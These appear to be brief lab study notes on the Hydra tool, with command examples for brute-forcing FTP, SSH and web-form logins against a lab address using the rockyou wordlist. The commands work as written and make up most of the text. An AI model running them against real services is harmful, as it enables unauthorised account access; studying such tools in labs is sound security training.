# Hydra

## Beispiele

```bash
# brute force ftp with username 'user' and a password list 'passlist.txt'
hydra -l user -P passlist.txt ftp://MACHINE_IP
# use hydra on ssh
# -l: specifies SSH username for login
# -P: indicates list of passwords
# -t: sets number of threads to spawn
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh

# use hydra on Post Web Form
sudo hydra <username> <wordlist> 10.10.171.15 http-post-form "<path>:<login_credentials>:<invalid_response>"
# more concrete example
# / indicates that the login page is the main IP address
# -l: the username for (web form) login
# the specified username(s) will replace ^USER^
# the provided passwords will replace ^PASS^
# F= incorrect is string that appears in server reply when login fails
hydra -l molly -P /usr/share/wordlists/rockyou.txt -u -m "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." 10.10.171.15 http-post-form
```

- brute force online password cracking
- can run through a list and brute force a lot of authentication services like SSH, Web App Form, FTP etc.
- options that are passes into Hydra depend on the service/protocol that is being attacked
